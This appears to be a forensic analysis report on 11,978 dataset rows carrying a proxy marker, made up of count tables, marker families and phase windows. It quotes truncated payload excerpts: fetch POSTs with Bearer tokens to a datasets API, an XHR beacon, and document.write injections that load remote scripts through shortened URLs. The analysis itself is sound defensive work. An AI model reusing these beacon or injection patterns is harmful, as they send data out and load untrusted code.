# Gateway marker `[PROXY 4 URL 72]` forensic study

Source data: `/Users/id19/Programming/AI_research/Apart_agent_swarm/Data/redacted_filtered.jsonl` (read-only).
Total rows in source: 187,242. Gateway marker rows: 11,978 (6.40% of all rows).

## 1. Scope and method

- Selected every row whose `text` contains the exact substring `[PROXY 4 URL 72]` (Python `in` test).
- Marker extraction regex used throughout: `\[[A-Z][^\]]*\]` (an opening bracket, an uppercase letter, then any characters except `]`). Lowercase bracket fragments are intentionally excluded because they are code/index expressions rather than marker endpoints.
- Rows ordered by the numeric suffix of `id` (e.g. `R0004650` -> 4650). All 187,242 source IDs are monotonic in file order, so file order and numeric order agree.
- Parent/text facts come directly from `kind`, `parent_id`, `text`; no content normalization was applied to source data.

## 2. Overall counts by kind (gateway-marker rows)

| kind | rows | share of gateway rows |
|---|---:|---:|
| payload | 7,727 | 64.51% |
| recovered_text | 2,194 | 18.32% |
| response | 2,057 | 17.17% |
| **total** | **11,978** | **100.00%** |

## 3. Ordered ID range

- Earliest gateway-marker row: `R0004650` (numeric suffix 4650).
- Latest gateway-marker row: `R0189520` (numeric suffix 189520).
- Gateway rows span ID suffixes 4650 .. 189520 but are sparse inside that range.
- First five ordered IDs: `R0004650`, `R0004793`, `R0005898`, `R0005910`, `R0005946`.
- Last five ordered IDs: `R0189497`, `R0189499`, `R0189503`, `R0189504`, `R0189520`.

## 4. parent_id relationships

- Rows with `parent_id`: 4,111 (34.32%).
- Rows without `parent_id`: 7,867.
- Unique parents cited by gateway rows: 791.
- Max gateway children attached to one parent: 44 (parent `R0049534`).
- Provenance is preserved: every child row keeps its original `parent_id`; no parent was rewritten or collapsed.

Top 25 parents by number of gateway-marker children:

| rank | parent_id | parent kind | gateway children | total children (all kinds) | parent contains target |
|---:|---|---|---:|---:|---:|
| 1 | `R0049534` | payload | 44 | 102 | no |
| 2 | `R0050038` | payload | 28 | 88 | no |
| 3 | `R0007057` | payload | 8 | 13 | yes |
| 4 | `R0007090` | payload | 8 | 13 | yes |
| 5 | `R0008228` | payload | 8 | 28 | yes |
| 6 | `R0030467` | payload | 8 | 19 | yes |
| 7 | `R0079024` | payload | 8 | 12 | yes |
| 8 | `R0079046` | payload | 8 | 14 | yes |
| 9 | `R0079099` | payload | 8 | 13 | yes |
| 10 | `R0079191` | payload | 8 | 13 | yes |
| 11 | `R0113618` | payload | 8 | 13 | yes |
| 12 | `R0113676` | payload | 8 | 13 | yes |
| 13 | `R0113681` | payload | 8 | 12 | yes |
| 14 | `R0113701` | payload | 8 | 13 | yes |
| 15 | `R0113721` | payload | 8 | 13 | yes |
| 16 | `R0113753` | payload | 8 | 13 | yes |
| 17 | `R0113779` | payload | 8 | 13 | yes |
| 18 | `R0006920` | payload | 6 | 11 | yes |
| 19 | `R0006927` | payload | 6 | 11 | yes |
| 20 | `R0006928` | payload | 6 | 11 | yes |
| 21 | `R0006982` | payload | 6 | 11 | yes |
| 22 | `R0007039` | payload | 6 | 11 | yes |
| 23 | `R0007040` | payload | 6 | 11 | yes |
| 24 | `R0007041` | payload | 6 | 11 | yes |
| 25 | `R0007042` | payload | 6 | 11 | yes |

Companion file: `proxy4_url72_top25_parents.csv`.

## 5. Marker co-occurrence (`[`...`]` markers in gateway rows)

- The target marker `[PROXY 4 URL 72]` occurs 12,946 times across the 11,978 gateway rows (some rows contain more than one copy).
- Excluding the target, 18,748 unique bracketed markers occur 40,473 times total.

Top 60 unique markers (excluding the target, by occurrence count):

| rank | marker | occurrences | rows containing |
|---:|---|---:|---:|
| 1 | `[REDACTED:opaque_marker_tail:000004]` | 2,909 | 2,909 |
| 2 | `[REDACTED:opaque_marker_tail:000007]` | 2,493 | 2,493 |
| 3 | `[REDACTED:opaque_marker_tail:000008]` | 1,495 | 1,495 |
| 4 | `[REDACTED:opaque_marker_tail:000015]` | 1,304 | 1,304 |
| 5 | `[REDACTED SENSITIVE CONTENT]` | 1,295 | 1,255 |
| 6 | `[REDACTED:opaque_marker_tail:000005]` | 1,224 | 1,224 |
| 7 | `[REDACTED:secret_key:000049]` | 371 | 371 |
| 8 | `[PROXY 49 URL 1]` | 356 | 354 |
| 9 | `[CREDENTIAL 170]` | 334 | 334 |
| 10 | `[REDACTED:opaque_marker_tail:000009]` | 281 | 281 |
| 11 | `[ENCODED BLOB]` | 241 | 236 |
| 12 | `[REDACTED:destination:000604]` | 215 | 215 |
| 13 | `[CREDENTIAL [ENCODED BLOB]` | 200 | 200 |
| 14 | `[SHORTENER URL 33664]` | 157 | 131 |
| 15 | `[CREDENTIAL 220]` | 143 | 143 |
| 16 | `[REDACTED:destination:000003]` | 130 | 79 |
| 17 | `[SHORTENER-3]` | 108 | 36 |
| 18 | `[REDACTED:opaque_fragment:000056]` | 106 | 106 |
| 19 | `[REDACTED:opaque_fragment:000061]` | 103 | 103 |
| 20 | `[REDACTED:destination:000454]` | 67 | 67 |
| 21 | `[REDACTED:destination:000002]` | 63 | 63 |
| 22 | `[REDACTED HF TOKEN FRAGMENT]` | 59 | 15 |
| 23 | `[REDACTED REPOSITORY]` | 50 | 45 |
| 24 | `[REDACTED:destination:000280]` | 50 | 50 |
| 25 | `[REDACTED:runtime_identifier]` | 49 | 49 |
| 26 | `[REDACTED:runtime_identifier:000003]` | 47 | 47 |
| 27 | `[SERVICE 2 URL 1]` | 47 | 47 |
| 28 | `[ENCODED BLOB 2005]` | 46 | 45 |
| 29 | `[REDACTED:destination:000279]` | 44 | 44 |
| 30 | `[REDACTED:destination:002162]` | 44 | 24 |
| 31 | `[PROXY 4 URL 6]` | 43 | 43 |
| 32 | `[REDACTED:destination:000589]` | 40 | 40 |
| 33 | `[HF REPO 555]` | 38 | 35 |
| 34 | `[REDACTED:aws_auth_value:000005]` | 36 | 36 |
| 35 | `[REDACTED:aws_auth_value:000006]` | 36 | 36 |
| 36 | `[SERVICE HOST 1]` | 36 | 34 |
| 37 | `[ENCODED BLOB 2006]` | 35 | 34 |
| 38 | `[REDACTED:source_path:000001]` | 35 | 35 |
| 39 | `[SHORTENER URL 88316]` | 35 | 35 |
| 40 | `[CREDENTIAL 169]` | 34 | 34 |
| 41 | `[CREDENTIAL 1]` | 33 | 33 |
| 42 | `[ENCODED BLOB 2007]` | 33 | 32 |
| 43 | `[HF REPO 1]` | 33 | 26 |
| 44 | `[SERVICE 2 URL 3]` | 32 | 32 |
| 45 | `[REDACTED RESEARCH METADATA]` | 31 | 24 |
| 46 | `[REDACTED:destination:005308]` | 30 | 30 |
| 47 | `[REDACTED:runtime_identifier:000023]` | 30 | 30 |
| 48 | `[RESEARCHER RECEIPT REMOVED]` | 28 | 28 |
| 49 | `[CREDENTIAL 1677]` | 27 | 27 |
| 50 | `[REDACTED RESEARCH INDEX]` | 27 | 27 |
| 51 | `[SHORTENER-1]` | 25 | 16 |
| 52 | `[SERVICE 1 URL 1]` | 24 | 24 |
| 53 | `[SHORTENER-2-HOST]` | 24 | 23 |
| 54 | `[REDACTED:destination:000850]` | 19 | 19 |
| 55 | `[CREDENTIAL 1856]` | 18 | 18 |
| 56 | `[CREDENTIAL 896]` | 18 | 18 |
| 57 | `[ENCODED BLOB 2074]` | 18 | 17 |
| 58 | `[REDACTED:destination:002163]` | 18 | 18 |
| 59 | `[REDACTED:runtime_identifier:000001]` | 18 | 18 |
| 60 | `[REDACTED:opaque_marker_tail:000183]` | 17 | 17 |

Companion file: `proxy4_url72_markers_top60.csv` (same 60 rows).

## 6. Grouped marker families (grouped only by visible digit positions)

Family labels were formed by replacing digit runs in a marker with `#`. No other normalization was performed; letter case, punctuation, redaction tags, and marker spellings remain exactly as observed.

| rank | family label | occurrences | rows containing | unique exact markers |
|---:|---|---:|---:|---:|
| 1 | `[ENCODED BLOB #]` | 15,603 | 15,047 | 10,520 |
| 2 | `[PROXY # URL #]` | 13,393 | 12,419 | 33 |
| 3 | `[REDACTED:opaque_marker_tail:#]` | 9,901 | 9,901 | 176 |
| 4 | `[SHORTENER URL #]` | 5,105 | 4,232 | 3,842 |
| 5 | `[REDACTED:opaque_fragment:#]` | 3,573 | 3,388 | 2,947 |
| 6 | `[REDACTED SENSITIVE CONTENT]` | 1,295 | 1,255 | 1 |
| 7 | `[REDACTED:destination:#]` | 1,057 | 985 | 222 |
| 8 | `[CREDENTIAL #]` | 721 | 715 | 90 |
| 9 | `[REDACTED:opaque_base#:#]` | 510 | 510 | 494 |
| 10 | `[REDACTED:secret_key:#]` | 380 | 380 | 6 |
| 11 | `[ENCODED BLOB]` | 241 | 236 | 1 |
| 12 | `[CREDENTIAL [ENCODED BLOB]` | 200 | 200 | 1 |
| 13 | `[SERVICE # URL #]` | 182 | 182 | 44 |
| 14 | `[REDACTED:source_identifier:#]` | 143 | 143 | 107 |
| 15 | `[SHORTENER-#]` | 134 | 53 | 3 |
| 16 | `[HF REPO #]` | 108 | 97 | 25 |
| 17 | `[REDACTED:runtime_identifier:#]` | 96 | 96 | 4 |
| 18 | `[REDACTED:aws_auth_value:#]` | 73 | 73 | 3 |
| 19 | `[REDIRECT URL #]` | 69 | 60 | 60 |
| 20 | `[REDACTED HF TOKEN FRAGMENT]` | 59 | 15 | 1 |
| 21 | `[REDACTED REPOSITORY]` | 50 | 45 | 1 |
| 22 | `[REDACTED:runtime_identifier]` | 49 | 49 | 1 |
| 23 | `[REDACTED:source_path:#]` | 42 | 42 | 8 |
| 24 | `[SHORTENER CODE #]` | 40 | 40 | 36 |
| 25 | `[REDACTED:query_value:#]` | 37 | 37 | 27 |
| 26 | `[SERVICE HOST #]` | 37 | 35 | 2 |
| 27 | `[USER #]` | 35 | 34 | 9 |
| 28 | `[SHORTENER-#-HOST]` | 34 | 33 | 3 |
| 29 | `[REDACTED RESEARCH METADATA]` | 31 | 24 | 1 |
| 30 | `[RESEARCHER RECEIPT REMOVED]` | 28 | 28 | 1 |

Total families observed: 64. Companion file: `proxy4_url72_marker_families.csv` (all families).

## 7. Evolution over ordered sample IDs

The gateway rows were sorted by numeric ID suffix, then split into three equal-size windows: first 5%, middle 5%, last 5%.

| feature | early (first 5%) | middle (middle 5%) | late (last 5%) |
|---|---|---|---|
| rows | 598 | 599 | 599 |
| ID range | `R0004650`-`R0058636` | `R0131872`-`R0135261` | `R0177172`-`R0189520` |
| kinds | payload:223, response:375 | payload:599 | recovered_text:599 |
| text length median (bytes) | 72 | 173 | 72 |
| text length min/max (bytes) | 35/2,971 | 90/298 | 36/73 |
| rows with parent_id | 375 | 0 | 597 |
| unique parents | 158 | 0 | 406 |
| encoded-blob numbered marker occurrences | 865 | 740 | 599 |
| encoded-blob unique IDs | 327 | 740 | 468 |
| rows containing encoded-blob IDs | 591 | 599 | 599 |
| REDIRECT URL ID occurrences | 69 | 0 | 0 |
| REDIRECT URL unique IDs | 60 | 0 | 0 |
| service/shortener marker occurrences | 49/449 | 1/487 | 0/0 |
| rows with service markers | 45 | 1 | 0 |
| rows with shortener markers | 221 | 487 | 0 |
| contains `new XMLHttpRequest` | 9 | 0 | 0 |
| contains `fetch(` | 146 | 0 | 0 |
| contains `new Image` | 32 | 0 | 0 |
| contains `document.write` | 208 | 406 | 0 |
| contains `atob(` | 28 | 3 | 0 |
| contains `.slice(` | 53 | 0 | 0 |
| contains `Uint8Array` | 64 | 0 | 0 |
| contains `location.hash` | 53 | 0 | 0 |
| contains `eval(` | 13 | 0 | 0 |
| contains `encodeURIComponent` | 6 | 0 | 0 |

Reading of the windows:

- Early window: mostly `response` and `payload` rows, generally longer, with XHR/fetch/image beacons, chunking (`slice`, `Uint8Array`, `location.hash`), service markers and the only REDIRECT URL IDs. This looks like an active execution/probing layer sitting inside the gateway path.
- Middle window: all `payload` rows, uniform short wrappers around 173 bytes, built as `[PROXY 4 URL 72][ENCODED BLOB <id>][REDACTED:opaque_marker_tail:...]` followed by a `document.write("<script src=[SHORTENER URL ...]></script>")` redirect. No parent links.
- Late window: all `recovered_text` rows, tiny 36-73 byte triplets of marker headers with no executable wrapper. Nearly every row keeps a `parent_id` (597 of 599; 406 unique parents).

Companion file: `proxy4_url72_evolution.csv`.

## 8. Repeated exact full text bodies

- Distinct full-text bodies among gateway rows: 9,911.
- Repeated bodies: 2,067, each repeated exactly 2 times; repeated rows total 4,134.
- Unique bodies appearing once: 7,844.

Top repeated bodies (ordered by body length):

| rank | repeats | length | body excerpt (first 160 chars) |
|---:|---:|---:|---|
| 1 | 2 | 1,147 | `HTTP/1.1 200 Connection established
 
 HTTP/1.1 301 Moved Permanently
 Date: Sun, 20 Sep 2026 02:33:23 GMT
 Content-Type: text/html; charset=utf-8
 Transfer-Enc` |
| 2 | 2 | 1,147 | `HTTP/1.1 200 Connection established
 
 HTTP/1.1 301 Moved Permanently
 Date: Sun, 20 Sep 2026 02:33:23 GMT
 Content-Type: text/html; charset=utf-8
 Transfer-Enc` |
| 3 | 2 | 1,147 | `HTTP/1.1 200 Connection established
 
 HTTP/1.1 301 Moved Permanently
 Date: Sun, 20 Sep 2026 02:33:24 GMT
 Content-Type: text/html; charset=utf-8
 Transfer-Enc` |
| 4 | 2 | 1,147 | `HTTP/1.1 200 Connection established
 
 HTTP/1.1 301 Moved Permanently
 Date: Sun, 20 Sep 2026 02:33:24 GMT
 Content-Type: text/html; charset=utf-8
 Transfer-Enc` |
| 5 | 2 | 1,147 | `HTTP/1.1 200 Connection established
 
 HTTP/1.1 301 Moved Permanently
 Date: Sun, 20 Sep 2026 02:33:23 GMT
 Content-Type: text/html; charset=utf-8
 Transfer-Enc` |
| 6 | 2 | 1,147 | `HTTP/1.1 200 Connection established
 
 HTTP/1.1 301 Moved Permanently
 Date: Sun, 20 Sep 2026 02:33:23 GMT
 Content-Type: text/html; charset=utf-8
 Transfer-Enc` |
| 7 | 2 | 1,147 | `HTTP/1.1 200 Connection established
 
 HTTP/1.1 301 Moved Permanently
 Date: Sun, 20 Sep 2026 02:33:23 GMT
 Content-Type: text/html; charset=utf-8
 Transfer-Enc` |
| 8 | 2 | 1,147 | `HTTP/1.1 200 Connection established
 
 HTTP/1.1 301 Moved Permanently
 Date: Sun, 20 Sep 2026 02:33:23 GMT
 Content-Type: text/html; charset=utf-8
 Transfer-Enc` |
| 9 | 2 | 1,147 | `HTTP/1.1 200 Connection established
 
 HTTP/1.1 301 Moved Permanently
 Date: Sun, 20 Sep 2026 02:33:24 GMT
 Content-Type: text/html; charset=utf-8
 Transfer-Enc` |
| 10 | 2 | 1,147 | `HTTP/1.1 200 Connection established
 
 HTTP/1.1 301 Moved Permanently
 Date: Sun, 20 Sep 2026 02:33:24 GMT
 Content-Type: text/html; charset=utf-8
 Transfer-Enc` |
| 11 | 2 | 1,147 | `HTTP/1.1 200 Connection established
 
 HTTP/1.1 301 Moved Permanently
 Date: Sun, 20 Sep 2026 02:33:23 GMT
 Content-Type: text/html; charset=utf-8
 Transfer-Enc` |
| 12 | 2 | 733 | `(async()=>{let u='[PROXY 49 URL 1]https://huggingface.co/api/datasets/[REDACTED:destination:000454]',r=await fetch(u,{method:'POST',headers:{Authorization:'Bear` |
| 13 | 2 | 646 | `(async()=>{let u='[PROXY 49 URL 1]https://huggingface.co/api/datasets/[REDACTED:destination:000454]',r=await fetch(u,{method:'POST',headers:{Authorization:'Bear` |
| 14 | 2 | 594 | `(async()=>{let r=await fetch('[PROXY 49 URL 1]https://huggingface.co/api/datasets/[REDACTED:destination:000604]',{method:'POST',headers:{Authorization:'Bearer [` |
| 15 | 2 | 542 | `(async()=>{let u='[PROXY 49 URL 1]https://huggingface.co/api/datasets/[REDACTED:destination:000454]',r=await fetch(u,{method:'POST',headers:{Authorization:'Bear` |

Companion file: `proxy4_url72_repeated_texts.csv` (top 100 by length).

## 9. Example early/mid/late samples

| phase | id | kind | parent_id | length | short excerpt |
|---|---|---|---|---:|---|
| early | `R0004650` | payload | null | 1,048 | `x=new XMLHttpRequest;x.open('POST','https://[REDACTED:destination:000002][SERVICE 2 URL 1]',false);x.setRequestHeader('Content-Type','application/json');x.setRe` |
| early | `R0054521` | response | R0007041 | 35 | `[PROXY 4 URL 72][ENCODED BLOB 2022]` |
| early | `R0058636` | response | R0029623 | 36 | `[PROXY 4 URL 72][ENCODED BLOB 21665]` |
| middle | `R0131872` | payload | null | 178 | `[PROXY 4 URL 72][ENCODED BLOB 87674][REDACTED:opaque_marker_tail:000007]   x+='[REDACTED:opaque_fragment:008297]';document.write('<script src=[SHORTENER URL 154` |
| middle | `R0133582` | payload | null | 173 | `[PROXY 4 URL 72][ENCODED BLOB 89915][REDACTED:opaque_marker_tail:000007]   x+='[REDACTED SENSITIVE CONTENT]';document.write('<script src=[SHORTENER URL 155635]>` |
| middle | `R0135261` | payload | null | 131 | `[PROXY 4 URL 72][ENCODED BLOB 92145][REDACTED:opaque_marker_tail:000015]   x+='[ENCODED BLOB 92146]';n('//[SHORTENER URL 156350]') ` |
| late | `R0177172` | recovered_text | R0113904 | 72 | `[PROXY 4 URL 72][ENCODED BLOB 65614][REDACTED:opaque_marker_tail:000004]` |
| late | `R0183624` | recovered_text | R0113946 | 72 | `[PROXY 4 URL 72][ENCODED BLOB 65631][REDACTED:opaque_marker_tail:000008]` |
| late | `R0189520` | recovered_text | R0079162 | 73 | `[PROXY 4 URL 72][ENCODED BLOB 53526][REDACTED:opaque_marker_tail:000004] ` |

## 10. Timestamped (broad text date/time cues) study

**Chosen regex (Python):**

```
(?i)(\b\d{4}-\d{2}-\d{2}(?:[ T]\d{2}:\d{2}(?::\d{2})?)?\b|\b\d{1,2}/\d{1,2}/\d{4}\b|\b(?:Jan|January|Feb|February|Mar|March|Apr|April|May|Jun|June|Jul|July|Aug|August|Sep|Sept|September|Oct|October|Nov|November|Dec|December)\s+\d{1,2},?\s+\d{4}\b|\b\d{1,2}\s+(?:Jan(?:uary)?|Feb(?:ruary)?|Mar(?:ch)?|Apr(?:il)?|May|Jun(?:e)?|Jul(?:y)?|Aug(?:ust)?|Sep(?:tember)?|Oct(?:ober)?|Nov(?:ember)?|Dec(?:ember)?)\s+\d{4}\b)
```

This combines ISO `YYYY-MM-DD` (optional `T HH:MM`), slash `DD/MM/YYYY` (or `MM/DD/YYYY`), `Mon DD, YYYY`, and `DD Mon YYYY` cues. Matches are case-insensitive word-bounded.

- Timestamped rows (whole dataset): 1,769 (kinds: payload:862, recovered_text:600, response:307).
- Gateway-marker rows among them: 43 of 11,978 (0.36%).
- Gateway-marker occurrence count inside timestamped rows: `[PROXY 4 URL 72]` appears 118 times.

Top 40 bracketed markers in timestamped rows:

| rank | marker | occurrences | rows containing |
|---:|---|---:|---:|
| 1 | `[REDACTED:source_path:000012]` | 2,128 | 327 |
| 2 | `[REDACTED:opaque_base64:000003]` | 1,223 | 313 |
| 3 | `[REDACTED SENSITIVE CONTENT]` | 1,117 | 486 |
| 4 | `[ENCODED BLOB]` | 932 | 428 |
| 5 | `[REDACTED:destination:000121]` | 863 | 391 |
| 6 | `[REDACTED REPOSITORY]` | 474 | 430 |
| 7 | `[REDACTED:source_identifier:000125]` | 461 | 399 |
| 8 | `[CREDENTIAL 15]` | 393 | 378 |
| 9 | `[SHORTENER CODE]` | 333 | 20 |
| 10 | `[USER 8]` | 327 | 314 |
| 11 | `[REDACTED:destination:000058]` | 304 | 292 |
| 12 | `[SHORTENER-1]` | 298 | 149 |
| 13 | `[REDACTED:source_identifier:000129]` | 268 | 222 |
| 14 | `[REDACTED:runtime_identifier]` | 243 | 219 |
| 15 | `[CREDENTIAL 25]` | 199 | 195 |
| 16 | `[REDACTED:query_value:000027]` | 178 | 170 |
| 17 | `[CREDENTIAL 27]` | 165 | 161 |
| 18 | `[CREDENTIAL 24]` | 159 | 155 |
| 19 | `[CREDENTIAL 223]` | 158 | 133 |
| 20 | `[REDACTED:cookie_value]` | 152 | 152 |
| 21 | `[REDACTED:hf_repo:000002]` | 149 | 137 |
| 22 | `[REDACTED:destination:000063]` | 143 | 130 |
| 23 | `[REDACTED:runtime_identifier:000001]` | 135 | 130 |
| 24 | `[SHORTENER-3]` | 126 | 42 |
| 25 | `[SERVICE 1 URL 1]` | 123 | 112 |
| 26 | `[SERVICE 2 URL 1]` | 121 | 118 |
| 27 | `[REDACTED:username:000004]` | 120 | 116 |
| 28 | `[PROXY 4 URL 72]` | 118 | 43 |
| 29 | `[CREDENTIAL 23]` | 117 | 117 |
| 30 | `[CREDENTIAL 1]` | 103 | 101 |
| 31 | `[REDACTED PRIVATE BUCKET]` | 103 | 92 |
| 32 | `[REDACTED:destination:000002]` | 103 | 100 |
| 33 | `[REDACTED:opaque_binary_carrier; exact original bytes retained privately]` | 102 | 102 |
| 34 | `[CREDENTIAL 43]` | 101 | 97 |
| 35 | `[WORKLOAD ID]` | 96 | 65 |
| 36 | `[SERVICE 9 URL 2]` | 94 | 93 |
| 37 | `[REDACTED:destination:008491]` | 92 | 1 |
| 38 | `[REDACTED:destination:000451]` | 86 | 40 |
| 39 | `[REDACTED:destination:013289]` | 85 | 1 |
| 40 | `[REDACTED:destination:000923]` | 77 | 70 |

Companion file: `proxy4_url72_timestamped_markers_top60.csv` and `proxy4_url72_timestamped_summary.json`.

## 11. Caveats (required)

- `[PROXY 4 URL 72]` is an infrastructure/endpoint pivot marker. Its presence does **not** show that two rows carry identical original content; repeated identical fragments can be routing or staging reuse rather than same-source text.
- Repeated marker use indicates a shared observed endpoint path or naming convention, possibly routing, staging, or a common scaffold. It is not by itself evidence of intent or causation.
- `parent_id` linkage is observational: parents may themselves be generated or recovered intermediates. Marker counts alone do not establish who generated anything, why, or what the traffic did.
- The dataset is redacted; opaque marker tails, encoded blobs, and destination IDs are already reduced. This study counts observable wrapper structure, it does not reconstruct original payloads.
- Timestamps are approximated by broad regex over text; rows have no structured `time_utc` field, so date-like strings inside code or data may be counted as timestamps. The chosen regex and count are reported above for transparency.

## 12. Output files

- `proxy4_url72_gateway_study.md`
- `proxy4_url72_gateway_rows.csv`
- `proxy4_url72_top25_parents.csv`
- `proxy4_url72_markers_top60.csv`
- `proxy4_url72_marker_families.csv`
- `proxy4_url72_evolution.csv`
- `proxy4_url72_repeated_texts.csv`
- `proxy4_url72_phase_examples.csv`
- `proxy4_url72_timestamped_markers_top60.csv`
- `proxy4_url72_timestamped_summary.json`
- `proxy4_url72_summary.json`
